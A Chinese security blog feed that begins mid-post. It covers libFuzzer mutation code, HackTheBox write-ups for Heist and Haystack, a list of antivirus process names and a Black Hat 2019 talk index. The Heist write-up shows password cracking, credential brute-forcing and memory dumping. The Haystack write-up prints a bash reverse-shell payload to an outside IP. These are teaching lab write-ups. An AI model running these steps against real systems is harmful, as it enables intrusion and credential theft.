memmove(To + ToInsertPos + CopySize, To + ToInsertPos, TailSize); memmove(To + ToInsertPos, From + FromBeg, CopySize); &#125; return ToSize + CopySize;&#125;size_t MutationDispatcher::Mutate_CopyPart(uint8_t *Data, size_t Size, size_t MaxSize) &#123; if (Size &gt; MaxSize || Size == 0) return 0; // If Size == MaxSize, `InsertPartOf(...)` will // fail so there's no point using it in this case. if (Size == MaxSize || Rand.RandBool()) return CopyPartOf(Data, Size, Data, Size); else return InsertPartOf(Data, Size, Data, Size, MaxSize);&#125; CrossOver从CrossOver、InsertPartOf和CopyPartOf中随机选择一种动作，其中CrossOver将Data和CrossOverWith中的数据以每次轮流取随机大小的块交叉排列组合在一起，InsertPartOf将CrossOverWith中随机位置处随机长度的数据插入到Data的随机位置处，CopyPartOf用CrossOverWith中随机位置处随机长度的数据对Data随机位置处的数据进行覆写。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970size_t MutationDispatcher::Mutate_CrossOver(uint8_t *Data, size_t Size, size_t MaxSize) &#123; if (Size &gt; MaxSize) return 0; if (Size == 0) return 0; if (!CrossOverWith) return 0; const Unit &amp;O = *CrossOverWith; if (O.empty()) return 0; MutateInPlaceHere.resize(MaxSize); auto &amp;U = MutateInPlaceHere; size_t NewSize = 0; switch(Rand(3)) &#123; case 0: NewSize = CrossOver(Data, Size, O.data(), O.size(), U.data(), U.size()); break; case 1: NewSize = InsertPartOf(O.data(), O.size(), U.data(), U.size(), MaxSize); if (!NewSize) NewSize = CopyPartOf(O.data(), O.size(), U.data(), U.size()); break; case 2: NewSize = CopyPartOf(O.data(), O.size(), U.data(), U.size()); break; default: assert(0); &#125; assert(NewSize &gt; 0 &amp;&amp; "CrossOver returned empty unit"); assert(NewSize &lt;= MaxSize &amp;&amp; "CrossOver returned overisized unit"); memcpy(Data, U.data(), NewSize); return NewSize;&#125;// compiler-rt/lib/fuzzer/FuzzerLoop.cppif (Options.DoCrossOver) MD.SetCrossOverWith(&amp;Corpus.ChooseUnitToMutate(MD.GetRand()).U);// compiler-rt/lib/fuzzer/FuzzerMutate.hvoid SetCrossOverWith(const Unit *U) &#123; CrossOverWith = U; &#125;// llvm-project/compiler-rt/lib/fuzzer/FuzzerCrossOver.cpp// Cross Data1 and Data2, store the result (up to MaxOutSize bytes) in Out.size_t MutationDispatcher::CrossOver(const uint8_t *Data1, size_t Size1, const uint8_t *Data2, size_t Size2, uint8_t *Out, size_t MaxOutSize) &#123; assert(Size1 || Size2); MaxOutSize = Rand(MaxOutSize) + 1; size_t OutPos = 0; size_t Pos1 = 0; size_t Pos2 = 0; size_t *InPos = &amp;Pos1; size_t InSize = Size1; const uint8_t *Data = Data1; bool CurrentlyUsingFirstData = true; while (OutPos &lt; MaxOutSize &amp;&amp; (Pos1 &lt; Size1 || Pos2 &lt; Size2)) &#123; // Merge a part of Data into Out. size_t OutSizeLeft = MaxOutSize - OutPos; if (*InPos &lt; InSize) &#123; size_t InSizeLeft = InSize - *InPos; size_t MaxExtraSize = std::min(OutSizeLeft, InSizeLeft); size_t ExtraSize = Rand(MaxExtraSize) + 1; memcpy(Out + OutPos, Data + *InPos, ExtraSize); OutPos += ExtraSize; (*InPos) += ExtraSize; &#125; // Use the other input data on the next iteration. InPos = CurrentlyUsingFirstData ? &amp;Pos2 : &amp;Pos1; InSize = CurrentlyUsingFirstData ? Size2 : Size1; Data = CurrentlyUsingFirstData ? Data2 : Data1; CurrentlyUsingFirstData = !CurrentlyUsingFirstData; &#125; return OutPos;&#125; ManualDict在参数-dict指定的ManualDictionary中随机选择一个Word插入或覆写到Data的随机位置。 12345678910111213141516171819202122232425262728293031323334353637383940414243// compiler-rt/lib/fuzzer/FuzzerMutate.h// Dictionary provided by the user via -dict=DICT_FILE.Dictionary ManualDictionary;size_t MutationDispatcher::Mutate_AddWordFromManualDictionary(uint8_t *Data, size_t Size, size_t MaxSize) &#123; return AddWordFromDictionary(ManualDictionary, Data, Size, MaxSize);&#125;size_t MutationDispatcher::AddWordFromDictionary(Dictionary &amp;D, uint8_t *Data, size_t Size, size_t MaxSize) &#123; if (Size &gt; MaxSize) return 0; if (D.empty()) return 0; DictionaryEntry &amp;DE = D[Rand(D.size())]; Size = ApplyDictionaryEntry(Data, Size, MaxSize, DE); if (!Size) return 0; DE.IncUseCount(); CurrentDictionaryEntrySequence.push_back(&amp;DE); return Size;&#125;size_t MutationDispatcher::ApplyDictionaryEntry(uint8_t *Data, size_t Size, size_t MaxSize, DictionaryEntry &amp;DE) &#123; const Word &amp;W = DE.GetW(); bool UsePositionHint = DE.HasPositionHint() &amp;&amp; DE.GetPositionHint() + W.size() &lt; Size &amp;&amp; Rand.RandBool(); if (Rand.RandBool()) &#123; // Insert W. if (Size + W.size() &gt; MaxSize) return 0; size_t Idx = UsePositionHint ? DE.GetPositionHint() : Rand(Size + 1); memmove(Data + Idx + W.size(), Data + Idx, Size - Idx); memcpy(Data + Idx, W.data(), W.size()); Size += W.size(); &#125; else &#123; // Overwrite some bytes with W. if (W.size() &gt; Size) return 0; size_t Idx = UsePositionHint ? DE.GetPositionHint() : Rand(Size - W.size()); memcpy(Data + Idx, W.data(), W.size()); &#125; return Size;&#125; PersAutoDict在PersistentAutoDictionary（运行过程中搜集有助于提升覆盖率的数据）中随机选择一个Word插入或覆写到Data的随机位置。 12345678// compiler-rt/lib/fuzzer/FuzzerLoop.cppDictionary PersistentAutoDictionary;size_t MutationDispatcher::Mutate_AddWordFromPersistentAutoDictionary( uint8_t *Data, size_t Size, size_t MaxSize) &#123; return AddWordFromDictionary(PersistentAutoDictionary, Data, Size, MaxSize);&#125; CMP-fsanitize-coverage=trace-cmp (on by default as part of -fsanitize=fuzzer) 在TableOfRecentCompares(TORC)（运行过程中记录执行过的比较操作）中随机选择一个Word插入或覆写到Data的随机位置。 12345678910111213141516171819202122232425262728293031323334353637size_t MutationDispatcher::Mutate_AddWordFromTORC( uint8_t *Data, size_t Size, size_t MaxSize) &#123; Word W; DictionaryEntry DE; switch (Rand(4)) &#123; case 0: &#123; auto X = TPC.TORC8.Get(Rand.Rand()); DE = MakeDictionaryEntryFromCMP(X.A, X.B, Data, Size); &#125; break; case 1: &#123; auto X = TPC.TORC4.Get(Rand.Rand()); if ((X.A &gt;&gt; 16) == 0 &amp;&amp; (X.B &gt;&gt; 16) == 0 &amp;&amp; Rand.RandBool()) DE = MakeDictionaryEntryFromCMP((uint16_t)X.A, (uint16_t)X.B, Data, Size); else DE = MakeDictionaryEntryFromCMP(X.A, X.B, Data, Size); &#125; break; case 2: &#123; auto X = TPC.TORCW.Get(Rand.Rand()); DE = MakeDictionaryEntryFromCMP(X.A, X.B, Data, Size); &#125; break; case 3: if (Options.UseMemmem) &#123; auto X = TPC.MMT.Get(Rand.Rand()); DE = DictionaryEntry(X); &#125; break; default: assert(0); &#125; if (!DE.GetW().size()) return 0; Size = ApplyDictionaryEntry(Data, Size, MaxSize, DE); if (!Size) return 0; DictionaryEntry &amp;DERef = CmpDictionaryEntriesDeque[CmpDictionaryEntriesDequeIdx++ % kCmpDictionaryEntriesDequeSize]; DERef = DE; CurrentDictionaryEntrySequence.push_back(&amp;DERef); return Size;&#125; Custom调用用户自定义实现的数据变异方法。 12345678// 用户定义方法接口，和LLVMFuzzerTestOneInput位于同一cpp中// extern "C" size_t LLVMFuzzerCustomMutatorsize_t MutationDispatcher::Mutate_Custom(uint8_t *Data, size_t Size, size_t MaxSize) &#123; return EF-&gt;LLVMFuzzerCustomMutator(Data, Size, MaxSize, Rand.Rand());&#125; CustomCrossOver调用用户自定义实现的数据交叉方法。 123456789101112131415161718size_t MutationDispatcher::Mutate_CustomCrossOver(uint8_t *Data, size_t Size, size_t MaxSize) &#123; if (Size == 0) return 0; if (!CrossOverWith) return 0; const Unit &amp;Other = *CrossOverWith; if (Other.empty()) return 0; CustomCrossOverInPlaceHere.resize(MaxSize); auto &amp;U = CustomCrossOverInPlaceHere; size_t NewSize = EF-&gt;LLVMFuzzerCustomCrossOver( Data, Size, Other.data(), Other.size(), U.data(), U.size(), Rand.Rand()); if (!NewSize) return 0; assert(NewSize &lt;= MaxSize &amp;&amp; "CustomCrossOver returned overisized unit"); memcpy(Data, U.data(), NewSize); return NewSize;&#125; 策略选择LibFuzzer随机选择编译策略，其关键代码位于515行。 123456789101112131415161718192021// Mutates Data in place, returns new size.size_t MutationDispatcher::MutateImpl(uint8_t *Data, size_t Size, size_t MaxSize, Vector&lt;Mutator&gt; &amp;Mutators) &#123; assert(MaxSize &gt; 0); // Some mutations may fail (e.g. can't insert more bytes if Size == MaxSize), // in which case they will return 0. // Try several times before returning un-mutated data. for (int Iter = 0; Iter &lt; 100; Iter++) &#123; auto M = Mutators[Rand(Mutators.size())]; // 这里 size_t NewSize = (this-&gt;*(M.Fn))(Data, Size, MaxSize); if (NewSize &amp;&amp; NewSize &lt;= MaxSize) &#123; if (Options.OnlyASCII) ToASCII(Data, NewSize); CurrentMutatorSequence.push_back(M); return NewSize; &#125; &#125; *Data = ' '; return 1; // Fallback, should not happen frequently.&#125; 随机选择编译策略的方法明显有所不足，因此有学者对此进行了改进，比如FuzzerGym: A Competitive Framework for Fuzzing and Learning，改论文采用强化学习（DQN）的方法来改进fuzz的效率，在此感谢Drozd教授的指导。 总结本文总结介绍了LibFuzzer的变异策略，有助于我们对其进行进一步的改进。]]></content>
      <categories>
        <category>模糊测试</category>
      </categories>
      <tags>
        <tag>LLVM</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[hackthebox-Heist]]></title>
    <url>%2F2019%2F11%2F03%2Fhackthebox-Heist%2F</url>
    <content type="text"><![CDATA[不同用户名可能对应相同的密码 nmap扫描，-p1-65535，得到端口80、135、445、5985、49668 123456789101112131480/tcp open http Microsoft IIS httpd 10.0| http-cookie-flags: | /: | PHPSESSID: |_ httponly flag not set| http-methods: |_ Potentially risky methods: TRACE|_http-server-header: Microsoft-IIS/10.0| http-title: Support Login Page|_Requested resource was login.php135/tcp open msrpc Microsoft Windows RPC445/tcp open microsoft-ds?5985/tcp open wsman49668/tcp open unknown 查看http://10.10.10.149，在Login as guest中下载Attachment的config.txt 1234567891011121314151617181920212223242526272829303132333435363738394041version 12.2no service padservice password-encryption!isdn switch-type basic-5ess!hostname ios-1!security passwords min-length 12enable secret 5 $1$pdQG$o8nrSzsGXeaduXrjlvKc91!username rout3r password 7 0242114B0E143F015F5D1E161713username admin privilege 15 password 7 02375012182C1A1D751618034F36415408!!ip ssh authentication-retries 5ip ssh version 2!!router bgp 100 synchronization bgp log-neighbor-changes bgp dampening network 192.168.0.0 mask 300.255.255.0 timers bgp 3 9 redistribute connected!ip classlessip route 0.0.0.0 0.0.0.0 192.168.0.1!!access-list 101 permit ip any anydialer-list 1 protocol ip list 101!no ip http serverno ip http secure-server!line vty 0 4 session-timeout 600 authorization exec SSH transport input ssh config.txt中提到Cisco的3个密码，2个为type7可直接解密，1个为type5使用hashcat解密；同时搜集到三个用户名rout3r、admin、Hazard，推测Hazard和type5的密码stealth1agent有关 使用impacket的lookupsid.py搜索其它用户名，发现support、Chase和Jason 1./lookupsid.py Hazard:stealth1agent@10.10.10.149 使用evil-winrm，用上述发现的用户名和密码组成的字典进行爆破，获得Chase的密码 1ruby evil-winrm.rb -i 10.10.10.149 -u Chase -p 'Q4)sJu\Y8qz*A3?d' 获得user.txt 查看Users目录发现主机用户有Administrator、Chase和Hazard 枚举进程，发现firefox 在evil-winrm中upload工具procdump64.exe，将firefox的进程内存dump下来 1./Procdump64.exe -accepteula -ma 6276 firefox-6276.dmp 搜索内存得到新密码 1select-string firefox-6276.dmp -pattern "password" # login_username=admin@support.htb&amp;login_password=4dD!5&#125;x/re8]FBuZ&amp;login= 使用evil-winrm以Administrator和新密码登录，获得root.txt]]></content>
      <categories>
        <category>渗透测试</category>
        <category>hackthebox</category>
      </categories>
      <tags>
        <tag>hackthebox</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[hackthebox-Haystack]]></title>
    <url>%2F2019%2F11%2F03%2Fhackthebox-Haystack%2F</url>
    <content type="text"><![CDATA[使用nmap扫描到端口22、80、9200（ElasticSearch 6.4.2） 1234567891011121322/tcp open ssh OpenSSH 7.4 (protocol 2.0)| ssh-hostkey: | 2048 2a:8d:e2:92:8b:14:b6:3f:e4:2f:3a:47:43:23:8b:2b (RSA)| 256 e7:5a:3a:97:8e:8e:72:87:69:a3:0d:d1:00:bc:1f:09 (ECDSA)|_ 256 01:d2:59:b2:66:0a:97:49:20:5f:1c:84:eb:81:ed:95 (ED25519)80/tcp open http nginx 1.12.2|_http-server-header: nginx/1.12.2|_http-title: Site doesn't have a title (text/html).9200/tcp open http nginx 1.12.2| http-methods: |_ Potentially risky methods: DELETE|_http-server-header: nginx/1.12.2|_http-title: Site doesn't have a title (application/json; charset=UTF-8). 访问 http://10.10.10.115 得到图片needle.jpg，Stegsolve查看图片可见base64的提示，解码得西班牙语得提示 12la aguja en el pajar es "clave"the needle in the haystack is "key" 使用elasticsearch-dump获取9200的quotes数据，在数据中搜索可得到两个base64加密的数据（搜索base64得特征字符，比如=），分别为用户名和密码，解码为security和spanish.is.key 1elasticdump --input=http://10.10.10.115:9200/quotes --output=quotes.json --type=data 使用ssh登录获得user.txt 使用scp上传LinEnum获取目标机器信息，首先发现logstash以root权限运行，查看/etc/logstash/conf.d/的配置文件，发现其需要root或kibana权限才可以查看 利用CVE-2018-17246获取kibana的shell 查看/etc/logstash/conf.d/的配置文件，发现logstash每10s读取/opt/kibana/logstash_*的内容并在过滤后执行，则echo &quot;Ejecutar comando : bash -i &gt;&amp; /dev/tcp/10.10.14.52/22222 0&gt;&amp;1&quot; &gt; /opt/kibana/logstash_ert（可自行搭建kibana，使用其grok调试器测试过滤效果），等待一段时间获取返回的shell 123456789101112131415161718192021222324252627282930cat /etc/logstash/conf.d/filter.conffilter &#123; if [type] == "execute" &#123; grok &#123; match =&gt; &#123; "message" =&gt; "Ejecutar\s*comando\s*:\s+%&#123;GREEDYDATA:comando&#125;" &#125; &#125; &#125;&#125;cat /etc/logstash/conf.d/input.confinput &#123; file &#123; path =&gt; "/opt/kibana/logstash_*" start_position =&gt; "beginning" sincedb_path =&gt; "/dev/null" stat_interval =&gt; "10 second" type =&gt; "execute" mode =&gt; "read" &#125;&#125;cat /etc/logstash/conf.d/output.confoutput &#123; if [type] == "execute" &#123; stdout &#123; codec =&gt; json &#125; exec &#123; command =&gt; "%&#123;comando&#125; &amp;" &#125; &#125;&#125; 获得root.txt]]></content>
      <categories>
        <category>渗透测试</category>
        <category>hackthebox</category>
      </categories>
      <tags>
        <tag>hackthebox</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[安全软件相关名称搜集]]></title>
    <url>%2F2019%2F10%2F10%2F%E5%AE%89%E5%85%A8%E8%BD%AF%E4%BB%B6%E7%9B%B8%E5%85%B3%E5%90%8D%E7%A7%B0%E6%90%9C%E9%9B%86%2F</url>
    <content type="text"><![CDATA[安全软件相关名称搜集，包括进程名等。 进程名 A B 360tray.exe 360安全卫士 360sd.exe 360杀毒 a2guard.exe a-squared杀毒 ad-watch.exe Lavasoft杀毒 cleaner8.exe The Cleaner杀毒 vba32lder.exe vb32杀毒 MongoosaGUI.exe Mongoosa杀毒 CorantiControlCenter32.exe Coranti2012杀毒 F-PROT.EXE F-PROT杀毒 CMCTrayIcon.exe CMC杀毒 K7TSecurity.exe K7杀毒 UnThreat.exe UnThreat杀毒 CKSoftShiedAntivirus4.exe Shield Antivirus杀毒 AVWatchService.exe VIRUSfighter杀毒 ArcaTasksService.exe ArcaVir杀毒 iptray.exe Immunet杀毒 PSafeSysTray.exe PSafe杀毒 nspupsvc.exe nProtect杀毒 SpywareTerminatorShield.exe SpywareTerminator杀毒 BKavService.exe Bkav杀毒 MsMpEng.exe Microsoft Security Essentials SBAMSvc.exe VIPRE ccSvcHst.exe Norton杀毒 QQ.exe QQ f-secure.exe 冰岛 avp.exe 卡巴斯基 KvMonXP.exe 江民杀毒 RavMonD.exe 瑞星杀毒 Mcshield.exe 麦咖啡 egui.exe NOD32 kxetray.exe 金山毒霸 knsdtray.exe 可牛杀毒 TMBMSRV.exe 趋势杀毒 avcenter.exe Avira(小红伞) ashDisp.exe Avast网络安全 rtvscan.exe 诺顿杀毒 ksafe.exe 金山卫士 QQPCRTP.exe QQ电脑管家 Miner.exe 流量矿石 AYAgent.aye 韩国胶囊 patray.exe 安博士 V3Svc.exe 安博士V3 avgwdsvc.exe AVG杀毒 ccSetMgr.exe 赛门铁克 QUHLPSVC.EXE QUICK HEAL杀毒 mssecess.exe 微软杀毒 SavProgress.exe Sophos杀毒 fsavgui.exe F-Secure杀毒 vsserv.exe 比特梵德 remupd.exe 熊猫卫士 FortiTray.exe 飞塔 safedog.exe 安全狗 parmor.exe 木马克星 beikesan.exe 贝壳云安全 KSWebShield.exe 金山网盾 TrojanHunter.exe 木马猎手 GG.exe 巨盾网游安全盾 adam.exe 绿鹰安全精灵 AST.exe 超级巡警 ananwidget.exe 墨者安全专家 AVK.exe GData ccapp.exe Symantec Norton avg.exe AVG Anti-Virus spidernt.exe Dr.web Mcshield.exe Mcafee avgaurd.exe Avira Antivir F-PROT.exe F-Prot AntiVirus vsmon.exe ZoneAlarm avp.exee Kaspersky cpf.exe Comodo outpost.exe Outpost Firewall rfwmain.exe 瑞星防火墙 kpfwtray.exe 金山网镖 FYFireWall.exe 风云防火墙 MPMon.exe 微点主动防御 pfw.exe 天网防火墙 S.exe 在抓鸡 1433.exe 在扫1433 DUB.exe 在爆破 ServUDaemon.exe 发现S-U BaiduSdSvc.exe 百度杀软 SafeDogGuardCenter.exe,safedogupdatecenter.exe,safedogguardcenter.exe,SafeDogSiteIIS.exe,SafeDogTray.exe,SafeDogServerUI.exe 安全狗 D_Safe_Manage.exe,d_manage.exe D盾 yunsuo_agent_service.exe,yunsuo_agent_daemon.exe 云锁 HwsPanel.exe,hws_ui.exe,hws.exe,hwsd.exe 护卫神 HipsDaemon.exe,HipsTray.exe,wsctrl.exe,usysdiag.exe 火绒]]></content>
      <categories>
        <category>安全开发</category>
      </categories>
      <tags>
        <tag>信息搜集</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Black Hat USA 2019 Briefings一览]]></title>
    <url>%2F2019%2F08%2F14%2FBlack-Hat-USA-2019-Briefings%E4%B8%80%E8%A7%88%2F</url>
    <content type="text"><![CDATA[议题地址 会议视频 爬虫导入 Neo4j Briefings 在 8.7~8.8 举行，共 21 类，123 个议题 TRACKS Malware 6 Exploit Development 17 Platform Security 13 Community 8 Applied Security 21 Hardware/Embedded 17 Human Factors 12 Cyber Insurance 3 Reverse Engineering 11 Web AppSec 15 Enterprise 12 Internet of Things 8 Cryptography 5 Mobile 12 Policy 12 Security Development Lifecycle 11 Smart Grid/Industrial Security 5 Data Forensics/Incident Response 9 Network Defense 13 Bug Bounty 3 Keynote 1 TITLES Titles Speakers Tracks 1 Flying a False Flag: Advanced C2, Trust Conflicts, and Domain Takeover GitHub Nick Landers Malware 2 Battle of Windows Service: A Silver Bullet to Discover File Privilege Escalation Bugs Automatically Wenxu Wu Exploit Development,Platform Security 3 Hacking Your Non-Compete Brian Dykstra,Gregory Stone Community 4 He Said, She Said – Poisoned RDP Offense and Defense Eyal Itkin,Dana Baril Exploit Development,Applied Security 5 Lessons and Lulz: The 5th Annual Black Hat USA NOC Report Bart Stump,Neil Wyler Applied Security 6 Biometric Authentication Under Threat: Liveness Detection Hacking Zhuo Ma,Bin Ma,Yu Chen Hardware/Embedded,Human Factors 7 How Do Cyber Insurers View The World? Matt Prevost Cyber Insurance 8 Hunting for Bugs, Catching Dragons 对 Outlook/Exchange 漏洞及利用的总结 Nicolas Joly Reverse Engineering,Exploit Development 9 Internet-Scale Analysis of AWS Cognito Security Andres Riancho Web AppSec,Enterprise 10 Moving from Hacking IoT Gadgets to Breaking into One of Europe’s Highest Hotel Suites Michael Huebler,Ray . Hardware/Embedded,Internet of Things 11 Messaging Layer Security: Towards a New Era of Secure Group Messaging Katriel Cohn-Gordon,Raphael Robert,Benjamin Beurdouche Applied Security,Cryptography 12 Bypassing the Maginot Line: Remotely Exploit the Hardware Decoder on Smartphone Peter Pi,Xiling Gong Exploit Development,Mobile 13 The Cyber Shell Game – War, Information Warfare, and the Darkening Web Alexander Klimburg Policy 14 Cybersecurity Risk Assessment for Safety-Critical Systems Daniel Johnson,Ken Heffner,Ly Vessels Security Development Lifecycle,Smart Grid/Industrial Security 15 ClickOnce and You’re in - When Appref-ms Abuse is Operating as Intended William Burke Human Factors,Applied Security 16 Deconstructing the Phishing Campaigns that Target Gmail Users Daniela Oliveira,Elie Bursztein Human Factors 17 Detecting Deep Fakes with Mice Alex Comerford,Jonathan Saunders,George Williams Human Factors,Data Forensics/Incident Response 18 Defense Against Rapidly Morphing DDOS Mikhail Fedorov,Mudit Tyagi Enterprise,Network Defense 19 Detecting Malicious Files with YARA Rules as They Traverse the Network David Bernal Data Forensics/Incident Response,Network Defense 20 Going Beyond Coverage-Guided Fuzzing with Structured Fuzzing Jonathan Metzman Security Development Lifecycle 21 Paging All Windows Geeks – Finding Evil in Windows 10 Compressed Memory Dimiter Andonov,Omar Sardar Reverse Engineering,Data Forensics/Incident Response 22 MINimum Failure - Stealing Bitcoins with Electromagnetic Fault Injection Colin O’Flynn Mobile,Hardware/Embedded 23 PeriScope: An Effective Probing and Fuzzing Framework for the Hardware-OS Boundary Dokyung Song Platform Security,Mobile 24 Reverse Engineering WhatsApp Encryption for Chat Manipulation and More Oded Vanunu,Roman Zaikin Reverse Engineering,Web AppSec 25 Legal GNSS Spoofing and its Effects on Autonomous Vehicles Victor Murray Hardware/Embedded,Internet of Things 26 Transparency in the Software Supply Chain: Making SBOM a Reality Allan Friedman Security Development Lifecycle,Policy 27 Monsters in the Middleboxes: Building Tools for Detecting HTTPS Interception Gabriele Fisher,Luke Valenta Web AppSec,Network Defense 28 Attack Surface as a Service Anna Westelius Web AppSec 29 Death to the IOC: What’s Next in Threat Intelligence Bhavna Soman Enterprise,Data Forensics/Incident Response 30 GDPArrrrr: Using Privacy Laws to Steal Identities James Pavur Human Factors,Policy 31 SSO Wars: The Token Menace Oleksandr Mirosh,Alvaro Munoz Enterprise,Web AppSec 32 Mobile Interconnect Threats: How Next-Gen Products May be Already Outdated Guillaume Teissier Exploit Development,Network Defense 33 On Trust: Stories from the Front Lines Jamil Farshchi Enterprise 34 Shifting Knowledge Left: Keeping up with Modern Application Security Fletcher Heisler,Mark Stanislav Human Factors,Security Development Lifecycle 35 APIC’s Adventures in Wonderland Frank Block,Oliver Matula Exploit Development,Network Defense 36 Testing Your Organization’s Social Media Awareness Jacob Wilkin Human Factors 37 The Future of Securing Intelligent Electronic Devices Using the IEC 62351-7 Standard for Monitoring Younes Dragoni,Alessandro Di Pinto,Andrea Carcano Smart Grid/Industrial Security 38 Attacking and Defending the Microsoft Cloud (Office 365 &amp; Azure AD) Mark Morowczynski,Sean Metcalf Network Defense,Enterprise 39 WebAuthn 101 - Demystifying WebAuthn Christiaan Brand Web AppSec,Applied Security 40 Woke Hiring Won’t Save Us: An Actionable Approach to Diversity Hiring and Retention Rebecca Lynch Policy,Community 41 100 Seconds of Solitude: Defeating Cisco Trust Anchor With FPGA Bitstream Shenanigans Ang Cui,Richard Housley,Jatin Kataria Reverse Engineering,Hardware/Embedded 42 Attacking Electric Motors for Fun and Profit Duminda Wijesekera,Matthew Jablonski Internet of Things,Smart Grid/Industrial Security 43 All Your Apple are Belong to Us: Unique Identification and Cross-Device Tracking of Apple Devices Xiaolong Bai,Min Zheng Applied Security,Mobile 44 Behind the Scenes: The Industry of Social Media Manipulation Driven by Malware Olivier Bilodeau,Masarah Paquet-Clouston Malware,Human Factors 45 Breaking Through Another Side: Bypassing Firmware Security Boundaries from Embedded Controller Alexandre Gazet,Alex Matrosov Platform Security,Reverse Engineering 46 Denial of Service with a Fistful of Packets: Exploiting Algorithmic Complexity Vulnerabilities David Renardy,Nathan Hauke Exploit Development,Web AppSec 47 Information Security in the Public Interest Bruce Schneier Policy,Community 48 Planning a Bug Bounty: The Nuts and Bolts from Concept to Launch Adam Ruddermann Bug Bounty 49 Dragonblood: Attacking the Dragonfly Handshake of WPA3 Mathy Vanhoef Network Defense,Cryptography 50 Exploiting the Hyper-V IDE Emulator to Escape the Virtual Machine Joe Bialek Platform Security,Exploit Development 51 Playing Offense and Defense with Deepfakes Matt Price,Mike Price Human Factors 52 Project Zero: Five Years of ‘Make 0Day Hard’ Ben Hawkes Platform Security,Exploit Development 53 Hacking for the Greater Good: Empowering Technologists to Strengthen Digital Society Eva Galperin,Camille Francois,Bruce Schneier Community 54 Rough and Ready: Frameworks to Measure Persistent Engagement and Deterrence Neil Jenkins,Jason Healey Data Forensics/Incident Response,Policy 55 The Enemy Within: Modern Supply Chain Attacks Eric Doerr Data Forensics/Incident Response,Enterprise 56 PicoDMA: DMA Attacks at Your Fingertips Ben Blaxill,Joel Sandin Platform Security,Hardware/Embedded 57 API-Induced SSRF: How Apple Pay Scattered Vulnerabilities Across the Web Joshua Maddux Applied Security,Web AppSec 58 Bounty Operations: Best Practices and Common Pitfalls to Avoid in the First 6-12 Months Josh Jay,Greg Caswell,Shannon Sabens,Jarek Stanley Bug Bounty 59 The Most Secure Browser? Pwning Chrome from 2016 to 2019 Gengming Liu,Zhen Feng Exploit Development,Platform Security 60 Breaking Encrypted Databases: Generic Attacks on Range Queries Marie-Sarah Lacharite Cryptography 61 DevSecOps : What, Why and How Anant Shrivastava Security Development Lifecycle,Applied Security 62 Finding Our Path: How We’re Trying to Improve Active Directory Security介绍 BloodHound，BloodHound 将获取 Domain Admin 方式以地图方式展示出来，并且能计算出最佳路径，大大提高了域渗透的效率 Will Schroeder,Rohan Vazarkar,Andy Robbins Enterprise 63 All the 4G Modules Could be Hacked百度安全实验室，移动网络 4G 安全攻击面 Zhang Ye,Zheng Huang,Haikuo Xie,Shupeng Gao Hardware/Embedded,Internet of Things 64 Operational Templates for State-Level Attack and Collective Defense of Countries Robert Fanelli,Gregory Conti Applied Security,Network Defense 65 Process Injection Techniques - Gotta Catch Them AllWindows 10 x64 进程注入技术总结（有开源代码），CFG 和 CIG 对各种技术的影响 Amit Klein,Itzik Kotler Exploit Development,Malware 66 Rogue7: Rogue Engineering-Station Attacks on S7 Simatic PLCs Eli Biham,Avishai Wool,Sara Bitan,Uriel Malin Reverse Engineering,Smart Grid/Industrial Security 67 Behind the Scenes of Intel Security and Manageability Engine Yanai Moyal,Shai Hasarfaty Applied Security,Hardware/Embedded 68 Women in Security: Building a Female InfoSec Community in Korea, Japan, and Taiwan Hazel Yen,Suhee Kang,Asuka Nakajima Community 69 Cyber Insurance 101 for CISO’s Jeffrey Smith Cyber Insurance 70 0-days &amp; Mitigations: Roadways to Exploit and Secure Connected BMW Cars Hendrik Schweppe,Michael Gruffke,Wenkai Zhang,Aohui Wang,Zhiqiang Cai Hardware/Embedded,Internet of Things 71 Behind the scenes of iOS and Mac Security Ivan Krstić Mobile,Platform Security 72 HTTP Desync Attacks: Smashing into the Cell Next Door James Kettle Web AppSec 73 Exploiting Qualcomm WLAN and Modem Over The Air腾讯安全 Blade Team，利用 WiFi 漏洞 RCE Peter Pi,Xiling Gong Exploit Development,Mobile 74 Firmware Cartography: Charting the Course for Modern Server Compromise Dionysus Blazakis,Nathan Keltner Platform Security,Hardware/Embedded 75 Ghidra - Journey from Classified NSA Tool to Open Source Chris Delikat,Brian Knighton Reverse Engineering 76 I’m Unique, Just Like You: Human Side-Channels and Their Implications for Security and Privacy Matt Wixey Applied Security,Human Factors 77 Infighting Among Russian Security Services in the Cyber Sphere Kimberly Zenz Policy 78 It’s Not What You Know, It’s What You Do: How Data Can Shape Security Engagement Aika Sengirbay,Masha Sedova Human Factors 79 Managing for Success: Maintaining a Healthy Bug Bounty Program Long Term Chloe Brown Bug Bounty 80 Practical Approach to Automate the Discovery and Eradication of Open-Source Software Vulnerabilities at Scale Aladdin Almubayed Web AppSec,Security Development Lifecycle 81 New Vulnerabilities in 5G Networks5G 商用网络的漏洞，漏洞可被利用实现中间人劫持和定向攻击 Ravishankar Borgaonkar,Altaf Shaik Network Defense,Mobile 82 Predictive Vulnerability Scoring System Jay Jacobs,Michael Roytman Network Defense,Enterprise 83 Selling 0-Days to Governments and Offensive Security Companies对 0-Day 市场买卖交易双方的介绍（和 ISC2019 的相同） Maor Shwartz,Maor Shwartz Policy,Community,Policy,Community 84 Zombie Ant Farming: Practical Tips for Playing Hide and Seek with Linux EDRs Dimitry Snezhkov Applied Security,Malware 85 Automation Techniques in C++ Reverse Engineering Rolf Rolles Reverse Engineering 86 Backdooring Hardware Devices by Injecting Malicious Payloads on Microcontrollers Sheila Ayelen Berta Reverse Engineering,Hardware/Embedded 87 Sensor and Process Fingerprinting in Industrial Control Systems Mujeeb Ahmed Chuadhry,Martin Ochoa Applied Security,Smart Grid/Industrial Security 88 Critical Zero Days Remotely Compromise the Most Popular Real-Time OS Dor Zusman,Ben Seri Network Defense,Internet of Things 89 Fantastic Red-Team Attacks and How to Find Them Ross Wolf,Casey Smith Applied Security,Data Forensics/Incident Response 90 The Path Less Traveled: Abusing Kubernetes Defaults Duffie Cooley,Ian Coldwater Platform Security 91 Inside the Apple T2 Jeremy Erickson,Mikhail Davidov Hardware/Embedded,Platform Security 92 Chip.Fail - Glitching the Silicon of the Connected World Josh Datko,Thomas Roth Internet of Things,Hardware/Embedded 93 Making Big Things Better the Dead Cow Way Luke Benfey,Christien Rioux,Peiter Mudge Zatko,Joseph Menn Community 94 Come Join the CAFSA - Continuous Automated Firmware Security Analysis固件分析工具 